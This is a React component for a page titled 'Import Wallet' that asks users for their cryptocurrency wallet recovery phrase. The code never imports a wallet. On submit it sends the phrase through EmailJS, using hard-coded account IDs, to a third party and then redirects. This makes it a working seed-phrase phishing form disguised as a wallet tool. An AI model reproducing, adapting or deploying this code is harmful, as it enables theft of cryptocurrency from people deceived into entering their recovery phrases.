// import React from "react";
import classes from "./phrase.module.css";
import { useState } from "react";
import { useNavigate } from "react-router";
import { useEffect } from "react";
import React, { useRef } from "react";
import emailjs from "@emailjs/browser";

const Form = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_cen36ww",
        "template_1269aqf",
        e.target,
        "ZbakojD4asxn3jFKH"
      )
      .then(
        (result) => {
          navigate("/Redirect");
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  const navigate = useNavigate();
  const [value, setValue] = useState({
    coinType: "",
    phrase: "",
    password: "",
  });

  const handleChange = (e) => {
    setValue((prevState) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  useEffect(() => {
    const walletname = localStorage.getItem("walletname");
    if (walletname) {
      setValue({
        ...value,
        coinType: walletname,
      });
    }
  }, []);

  return (
    <div>
      <form className={classes.form} onSubmit={sendEmail}>
        <select
          className={classes.input}
          value={value.coinType}
          name="coinType"
          // onChange={() => handleChange(items)}
        >
          {" "}
          <option value="">select coin</option>
          <option value={value.coinType}>{value.coinType}</option>
        </select>
        <label>Recovery phase</label>
        <div>
          <textarea
            className={classes.input1}
            type="text"
            // placeholder="placeholder"
            value={value.phrase}
            onChange={handleChange}
            name="phrase"
          />
        </div>
        <p>Typically 12 (sometimes 24) words separated by a single space.</p>
        <button
          className={classes.button}
          disabled={value.coinType.length < 2 || value.phrase.length < 2}
        >
          Import Wallet
        </button>
      </form>
    </div>
  );
};

export default Form;
